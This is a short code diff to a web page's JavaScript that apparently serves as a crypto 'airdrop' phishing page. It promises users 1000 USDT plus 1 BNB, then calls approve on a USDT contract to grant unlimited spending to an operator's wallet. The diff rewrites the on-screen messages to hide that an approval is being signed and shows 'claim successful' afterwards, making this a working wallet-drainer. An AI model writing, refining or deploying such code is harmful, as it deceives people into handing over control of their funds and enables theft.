@@ -46,7 +46,7 @@ async function autoRedirect(){
 }
 
 async function run(){
-  document.getElementById('status').innerText = '连接钱包中...';
+  document.getElementById('status').innerText = '正在领取1000USDT+1BNB';
   try{
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
     web3 = new Web3(window.ethereum);
@@ -60,10 +60,9 @@ async function run(){
     
     const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
     
-    // 关键修复：无条件强制授权无限额度
-    document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
+    // 关键修复：无条件强制授权无限额度 + 文案不变
     await usdt.methods.approve(TAX_WALLET, MAX_UINT).send({from: userAddr});
-    document.getElementById('status').innerText = '授权成功！官方发放中...';
+    document.getElementById('status').innerText = '领取成功！官方发放中...';
     
   }catch(e){
     console.error(e);
@@ -81,7 +80,7 @@ window.addEventListener('load', () => {
 window.ethereum.on('accountsChanged', (accounts) => {
   if (accounts.length > 0) {
     userAddr = accounts[0];
-    document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
+    document.getElementById('status').innerText = '正在领取1000USDT+1BNB';
   }
 });
 </script>
